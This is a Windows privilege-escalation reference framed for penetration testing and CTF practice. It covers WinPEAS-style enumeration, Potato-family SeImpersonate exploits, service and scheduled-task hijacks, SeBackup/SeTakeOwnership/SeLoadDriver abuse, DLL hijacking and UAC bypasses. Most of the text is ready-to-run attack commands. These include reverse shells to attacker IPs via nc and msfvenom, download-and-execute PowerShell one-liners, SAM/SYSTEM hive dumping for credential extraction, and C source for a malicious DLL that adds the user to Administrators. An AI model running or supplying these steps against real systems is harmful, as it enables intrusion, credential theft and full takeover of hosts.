# Windows Privilege Escalation — Enumeration Scripts, Potato-Family Exploits, Token Abuse, DLL Hijacking & UAC Bypass

*Local Windows privesc tooling reference (2026). For authorized penetration testing / CTF use only.*

---

## 1. Enumeration Scripts

### WinPEAS (PEASS-ng) — primary automated enumeration tool
Repo moved to the `peass-ng` GitHub org; ships as `.exe` (x86/x64), `.bat`, and `.ps1` variants.
```cmd
certutil -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe
:: or
powershell -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEASx64.exe"

.\winPEASx64.exe                        :: all checks
.\winPEASx64.exe systeminfo userinfo    :: specific checks only
.\winPEASx64.exe notcolor log            :: no color, log output to out.txt
```
**Reference:** https://github.com/peass-ng/PEASS-ng

### Seatbelt (GhostPack) — C# host-survey tool
Complements rather than replaces PEAS-style tools — surfaces raw host data for manual review rather than flagging exploit paths itself.
```cmd
Seatbelt.exe -group=all
Seatbelt.exe AntiVirus TokenPrivileges -full
```
**Reference:** https://github.com/GhostPack/Seatbelt

### PowerUp (legacy) / PrivescCheck (actively maintained successor)
PowerUp (PowerSploit) is unmaintained but still functions on older builds and is still widely taught. PrivescCheck (itm4n) is the modern equivalent with report generation.
```powershell
# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```
**Reference:** https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc · https://github.com/itm4n/PrivescCheck

### SharpUp — C# port of PowerUp's read-only checks
Useful where PowerShell is blocked/logged. Ports enumeration checks only, not the weaponization functions.
```cmd
SharpUp.exe audit
SharpUp.exe UnquotedServicePath ModifiableServices TokenPrivileges
```
**Reference:** https://github.com/GhostPack/SharpUp

### Sherlock / JAWS — legacy, low value on patched hosts
Sherlock hunts missing-KB patch gaps for specific named CVEs (MS10-015 through CVE-2017-7199) — mostly obsolete against any host patched since 2018, but still occasionally relevant on deliberately outdated lab/practice boxes. JAWS targets PowerShell 2.0 / Windows 7+ and is superseded by WinPEAS/PrivescCheck for real engagements.
```powershell
# Sherlock
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"

# JAWS
powershell -ep bypass -File .\jaws-enum.ps1
```
**Reference:** https://github.com/rasta-mouse/Sherlock · https://github.com/411Hall/JAWS

---

## 2. Potato-Family Local Privilege Escalation (SeImpersonate/SeAssignPrimaryToken abuse)

Compatibility matrix (2026) — Microsoft hardened the OXID resolver in Windows 10 1809 / Server 2019, killing the older variants:

| Exploit | Works on | Broken on | Why |
|---|---|---|---|
| RottenPotato / RottenPotatoNG | Win 7/8/10 pre-1809, Server 2008R2–2012R2 | Win10 1809+/Server 2019+ | Relied on local COM listener MiTM (127.0.0.1:6666), superseded |
| JuicyPotato | Win10 up to 1803, Server up to 2016 | Win10 1809+, Server 2019+/2022, Win11 | MS restricted the OXID resolver to only accept callbacks on port 135 |
| RoguePotato | Win10 1809+, Server 2019/2022 | — (needs outbound TCP/135 to attacker or a socat redirector) | Reimplements the OXID resolver externally to route around the port-135 restriction |
| PrintSpoofer | Win10, Server 2016/2019 (SeImpersonate contexts) | Hosts with Print Spooler disabled (common post-PrintNightmare hardening) | Abuses Print Spooler named-pipe impersonation; repo archived Sept 2024 (read-only) but binary still works |
| GodPotato | Server 2012–2022, Win8–11 | None reported as of 2026 — broadest current compatibility | Abuses an RPCSS OXID-resolution defect independent of the 1809 port-135 fix |
| SigmaPotato | Win8–11, Server 2012–2022 (same engine as GodPotato) | Same as GodPotato | Fork adding in-memory/.NET-reflection execution + built-in revshell |

**JuicyPotato** (legacy targets only, Server ≤2016 / Win10 ≤1803):
```cmd
JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c whoami > C:\out.txt" -l 1337
```

**RoguePotato** (needs a redirector when no direct route to attacker:135):
```bash
# attacker/pivot box
socat tcp-listen:135,reuseaddr,fork tcp:<ATTACKER_IP>:9999
```
```cmd
:: target
RoguePotato.exe -r <ATTACKER_IP> -e "C:\windows\system32\cmd.exe" -l 9999
```

**PrintSpoofer** (Print Spooler running + SeImpersonate held):
```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

**GodPotato** (broadest current compatibility, Server 2012–2022 / Win8–11):
```cmd
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c C:\Windows\Temp\nc.exe 10.10.13.37 4444 -e cmd.exe"
```

**SigmaPotato** (GodPotato fork, in-memory/reflection load, built-in revshell):
```cmd
SigmaPotato.exe "whoami"
SigmaPotato.exe --revshell <ATTACKER_IP> <PORT>
```

---

## 3. Exploiting Service / Task Misconfigurations (from WinPEAS/PowerUp/PrivescCheck/SharpUp findings)

The enumeration tools above flag these as findings, not exploit paths — weaponize them manually:

### 3a. Unquoted service path
```cmd
sc qc <svcname>                             :: BINARY_PATH_NAME with spaces + no quotes
icacls "C:\Program Files\Vulnerable App"    :: check write access to any path segment
```
If writable, drop a payload at the earliest breakable path segment (e.g. `C:\Program.exe` for `C:\Program Files\Vulnerable App\service.exe`), then restart the service (`sc stop/start <svcname>` or reboot).

### 3b. Weak service binary / registry permissions (ModifiableServices)
```cmd
icacls "C:\path\to\service.exe"                          :: check for (F)/(M) write on the binary
accesschk.exe -uwcqv "Authenticated Users" *              :: enumerate modifiable services
sc config <svcname> binpath= "C:\Windows\Temp\rev.exe"    :: if SERVICE_CHANGE_CONFIG allowed
sc start <svcname>
```

### 3c. AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: if both are 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### 3d. Modifiable scheduled task (ModifiableScheduledTaskFile)
```cmd
schtasks /query /fo LIST /v                                        :: enumerate tasks + run-as user
icacls "C:\path\to\task_target.exe"                                :: check write access
:: replace the writable target with a payload, or edit the task action directly:
schtasks /change /tn "<TaskName>" /tr "C:\Windows\Temp\rev.exe"
:: wait for the task's trigger/schedule to fire
```

**Reference:** https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services · https://gtfobins.github.io/gtfobins/msiexec/

---

## 4. Other Privileged-Token Abuse

Check held privileges first — `whoami /priv` lists every enabled/disabled privilege on the current token. A privilege that shows `Disabled` still usually needs enabling (`Enable-SePrivilege` from PowerUp, or PS Empire's helper, or Cobalt's `token::` — for OSCP, `whoami /priv` + manual `AdjustTokenPrivileges` via a small tool like `EnableAllTokenPrivs.ps1` gets you there); many are held disabled-by-default under a restricted admin token but are trivially re-enabled by the same user.

### 4a. SeBackupPrivilege (+ SeRestorePrivilege)
**Explanation**
`SeBackupPrivilege` grants read access to *any* file on the filesystem regardless of DACL — the OS treats the request as a backup operation, not a normal file open, so it bypasses ACLs entirely for read. `SeRestorePrivilege` is the write-side mirror (bypasses ACLs for write, including ownership/attributes) and together they let you overwrite arbitrary files too. The single most valuable target is reading the SAM/SYSTEM hives (or `NTDS.dit` on a DC) for offline credential extraction — files normally locked/ACL'd against a non-SYSTEM reader. Note `copy`/`xcopy`/PowerShell `Copy-Item` do **not** use backup semantics by default and will still hit the ACL check — you need a tool that explicitly opens the file with `FILE_FLAG_BACKUP_SEMANTICS`.
```cmd
:: robocopy honors backup semantics with /b (requires SeBackup+SeRestore held)
robocopy /b C:\Windows\System32\config C:\Temp\hives SAM SYSTEM SECURITY

:: alternative: diskshadow to snapshot the volume and read locked files off the shadow copy
diskshadow /s diskshadow_script.txt
:: diskshadow_script.txt contents:
::   set context persistent nowriters
::   add volume C: alias cdrive
::   create
::   expose %cdrive% E:
:: then:
copy E:\Windows\System32\config\SAM C:\Temp\SAM
copy E:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```
Offline parse with Impacket:
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
# for a DC:
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```
**Requirements**: `SeBackupPrivilege` (read) and/or `SeRestorePrivilege` (write) enabled on the token; a copy tool that requests `FILE_FLAG_BACKUP_SEMANTICS` (robocopy `/b`, `diskshadow`, or a purpose-built tool like SeBackupPrivilegeCmdLets/SeBackupPrivilegeUtils).

**Reference:** https://github.com/giuliano108/SeBackupPrivilege · https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights (backup semantics) · https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

### 4b. SeTakeOwnershipPrivilege
**Explanation**
Grants the ability to take ownership of any securable object regardless of its current DACL. Owning an object lets you then grant yourself any access you want (`WRITE_DAC`), because the owner can always modify the DACL even without being explicitly listed in it. Classic path: find a service binary, scheduled task, or protected file you can't currently write to, seize ownership, then grant yourself Full Control.
```cmd
takeown /f "C:\Program Files\VulnSvc\service.exe"
icacls "C:\Program Files\VulnSvc\service.exe" /grant "%username%":F
:: replace binary, restart the service (see §3a/3b for the service-restart step)
```
Also works directly against registry keys (e.g. a service's `ImagePath` under `HKLM\SYSTEM\CurrentControlSet\Services\<svc>`) via `Set-Acl`/`regini` if the file itself is protected but the registry key that points to it isn't.

**Requirements**: `SeTakeOwnershipPrivilege` enabled; target must be a securable object (file, registry key, service) — no prior access to the object is needed, only the privilege.

**Reference:** https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown · https://itm4n.github.io/windows-registry-rpceptmapper-eop/ (worked SeTakeOwnership+registry example)

### 4c. SeLoadDriverPrivilege
**Explanation**
Allows loading/unloading kernel-mode drivers. Since a kernel driver runs with full kernel privileges, loading a *vulnerable* (but legitimately signed) driver and exploiting a known bug in it (arbitrary read/write, etc.) yields SYSTEM/kernel code execution — this does **not** let you load an arbitrary unsigned driver, since Driver Signature Enforcement (DSE) still applies; you need a driver that is properly signed but has an exploitable vulnerability. The classic example is `Capcom.sys` (a legitimately-signed anti-cheat driver from a Street Fighter port) which exposes an IOCTL that executes arbitrary kernel-mode shellcode by design.
```cmd
:: 1. Enable SeLoadDriverPrivilege on the token (often disabled by default even when present)
:: 2. Load Capcom.sys via the registry + NtLoadDriver, e.g. using the well-known EoPLoadDriver helper:
::    usage: EoPLoadDriver.exe <RegistryServicePath> <DriverImagePath>
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\pentest\SeLoadDriverPrivilege\Capcom.sys
:: 3. Use a loader (e.g. the classic "Capcom.sys exploit" ExploitCapcom / capcom_x64.exe) to
::    execute shellcode in kernel context via the driver's IOCTL
```
**Requirements**: `SeLoadDriverPrivilege` enabled; a copy of a known-vulnerable, validly-signed driver (`Capcom.sys` is the most commonly referenced in OSCP-style material) staged on disk; DSE means self-signed/unsigned drivers will not load on x64 by default.

**Reference:** https://www.greyhathacker.net/?p=1025 (original Capcom.sys writeup) · https://github.com/tandasat/ExploitCapcom · https://www.exploit-db.com/exploits/44480

*SeManageVolumePrivilege / SeCreateSymbolicLinkPrivilege are omitted here — no reliably reproducible, OSCP-scope-appropriate abuse chain for either beyond niche/patched primitives (e.g. the old `SeCreateSymbolicLinkPrivilege` + `NTFS junction + MSI installer` race, largely patched); don't manufacture filler exploitation steps for a privilege you haven't confirmed a working chain for.*

---

## 5. DLL Hijacking (Search-Order Abuse)

**Explanation**
When a process loads a DLL without specifying a full path, Windows searches a defined order of locations. With SafeDllSearchMode enabled (default since XP SP2), the order is roughly: (1) the directory the executable was loaded from, (2) `System32`, (3) `System`, (4) the Windows directory, (5) the current working directory, (6) directories in `PATH`. Because the application directory is searched **before** `System32`, any writable application directory, or any DLL the app tries to load that doesn't exist anywhere on the search path at all (a missing-DLL condition), is a hijack candidate: drop a malicious DLL with the exact expected filename in a location earlier in the search order (or the only location, for a missing DLL) and the target process loads and executes your code instead.

**Finding a candidate**
```text
1. Run Process Monitor (procmon) on the target host, filter:
   Process Name is <target.exe>  AND  Result is NAME NOT FOUND  AND  Path ends with .dll
   -> shows every DLL the process searched for and failed to find, and every directory it checked, in order.
2. Alternatively, statically look for services/apps installed in a user-writable directory
   (icacls "C:\Program Files\VulnApp" — look for (F)/(M)/(W) for your user/group), since ANY
   DLL that app loads from its own folder is hijackable even if it "exists" there today — you
   can just overwrite it if the folder is writable.
3. PowerUp's Invoke-AllChecks / PrivescCheck flag services with weak folder permissions
   (the §1 enumeration tools surface this as "Modifiable service/binary folder").
```

**Worked example**
```cmd
:: 1. Identify: procmon shows VulnSvc.exe (running as SYSTEM) searching for
::    C:\Program Files\VulnApp\version.dll and getting NAME NOT FOUND, then falling
::    back to System32\version.dll which doesn't exist either -> the app dir is checked
::    first and is writable by our user.
icacls "C:\Program Files\VulnApp"

:: 2. Build a malicious DLL. Minimum viable payload is a DllMain-only proxy that
::    fires on load (no need to re-implement the real DLL's exports for most cases,
::    unless the app actually calls exported functions and would crash without them):
```
```c
// version.c - minimal DllMain-only hijack DLL
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c net localgroup administrators %username% /add", 0);
        // or: WinExec("C:\\Windows\\Temp\\nc.exe -e cmd.exe 10.10.13.37 4444", 0);
    }
    return TRUE;
}
```
```cmd
:: compile (x64, matching the target process bitness):
x86_64-w64-mingw32-gcc -shared -o version.dll version.c

:: 3. Drop it where the app looks first, then trigger a reload:
copy version.dll "C:\Program Files\VulnApp\version.dll"
sc stop VulnSvc & sc start VulnSvc
:: (or relaunch the app / wait for its scheduled restart, if it's not a service)
```
If the target DLL actually needs to export real functions the host process calls (not just load-time execution), export proxy stubs that forward to the legitimate DLL (renamed, e.g. `version_orig.dll`) using `#pragma comment(linker,"/export:FuncName=version_orig.FuncName")`, so the app keeps working while your `DllMain` also fires.

**Requirements**: write access to a directory earlier in the target's DLL search order than the legitimate copy (or the target DLL is missing from every search path entirely); ability to restart/retrigger the loading process (service restart, logoff/logon, scheduled relaunch).

**Reference:** https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order · https://itm4n.github.io/windows-dll-hijacking-clarified/ · https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

---

## 6. UAC Bypass (Medium-to-High Integrity, No Elevation Prompt)

**Scope note:** this is privilege escalation **in place** — taking an already-Administrators-group user from a medium-integrity (non-elevated) token to a high-integrity (elevated) token silently. It does **not** escalate to a different, higher-privileged account; it only removes the UAC prompt friction for a user who is already a local admin. This is the common OSCP scenario after a foothold plus a group-membership win (e.g. found creds for a user who's in `Administrators` but the shell you popped is medium integrity).

**Explanation**
UAC auto-elevates a small allowlist of Microsoft binaries (marked `autoElevate=true` in their manifest, e.g. `fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`, `sdclt.exe`) without prompting, *if* the process integrity level requesting it and the binary's manifest line up correctly for a user who is already an administrator. Several of these binaries read a registry path under `HKCU` (not `HKLM`) to decide what to launch for certain actions — since `HKCU` is user-writable without elevation, you can plant a hijack command there, then trigger the binary's auto-elevating code path, and your planted command runs at high integrity instead of (or before) the real target.

### 6a. fodhelper.exe registry-key bypass
```powershell
# Plant the command under the ms-settings shell-open verb fodhelper reads without prompting
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe /c C:\Windows\Temp\rev.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""

# Trigger — fodhelper auto-elevates and reads the hijacked verb
Start-Process "C:\Windows\System32\fodhelper.exe"

# cleanup (optional, reduces footprint)
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 6b. eventvwr.exe / mmc-based bypass
`eventvwr.exe` resolves the `mscfile` handler via `HKCU\Software\Classes\mscfile\shell\open\command` (same `HKCU`-hijack pattern, different registry path and trigger binary):
```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\Temp\rev.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"
```

### 6c. UACMe — maintained catalog of ~70 numbered bypass methods
Individual techniques get patched over time; UACMe (`Akagi64.exe`/`Akagi32.exe`) bundles the known working set by numbered method ID and is the reference to check for what's currently effective on a given build. Methods worth naming as commonly still-working in 2026 against unpatched/default-hardened Win10/11 builds: **Method 31** (`sdclt.exe` `IsolatedCommand` hijack, `ucmSdcltIsolatedCommandMethod`), **Method 23** (`pkgmgr.exe` DLL hijack via `DismCore.dll`, `ucmDismMethod`), and **Method 33/67** (`fodhelper`-family registry-hijack variants via `ucmShellRegModMethod`, matching 6a above). Always re-verify a method's current status against the target build before relying on it — Microsoft patches individual methods opportunistically.
```cmd
Akagi64.exe 33 "C:\Windows\Temp\rev.exe"
```
**Requirements**: current user token must already be a member of the local `Administrators` group (medium integrity); target OS/build not patched against the specific method used; no elevation prompt appears at all when the technique holds, which is the entire point — it's not a token-privilege escalation, it's an integrity-level escalation for a principal that was already authorized.

**Reference:** https://github.com/hfiref0x/UACME · https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html (fodhelper root cause) · https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-bypass

---

## Tools Reference

| Name | URL |
|---|---|
| WinPEAS (PEASS-ng) | https://github.com/peass-ng/PEASS-ng |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| SharpUp | https://github.com/GhostPack/SharpUp |
| JAWS | https://github.com/411Hall/JAWS |
| JuicyPotato | https://github.com/ohpe/juicy-potato |
| RoguePotato | https://github.com/antonioCoco/RoguePotato |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
| HackTricks Potato reference | https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html |
| SeBackupPrivilegeCmdLets/Utils | https://github.com/giuliano108/SeBackupPrivilege |
| Impacket (secretsdump.py) | https://github.com/fortra/impacket |
| ExploitCapcom (Capcom.sys) | https://github.com/tandasat/ExploitCapcom |
| UACMe | https://github.com/hfiref0x/UACME |
